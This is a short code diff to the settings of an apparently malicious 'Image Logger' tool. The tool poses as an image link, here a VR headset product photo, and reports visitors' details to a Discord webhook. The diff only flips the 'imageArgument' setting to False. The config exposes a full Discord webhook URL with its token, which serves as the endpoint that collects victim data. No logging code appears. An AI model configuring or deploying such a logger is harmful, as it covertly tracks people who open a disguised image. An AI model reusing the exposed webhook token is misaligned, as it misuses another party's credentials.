@@ -15,7 +15,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1401237408368033885/YjgzC6hjpWt1la3iAe03sZXzYPYJ1kKLftNKVA7jeWU9IZVKhpXlltMjzky6CZwXSQr0",
     "image": "https://thumb.pccomponentes.com/w-530-530/articles/1086/10864548/1760-meta-quest-3s-gafas-de-realidad-virtual-128gb.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
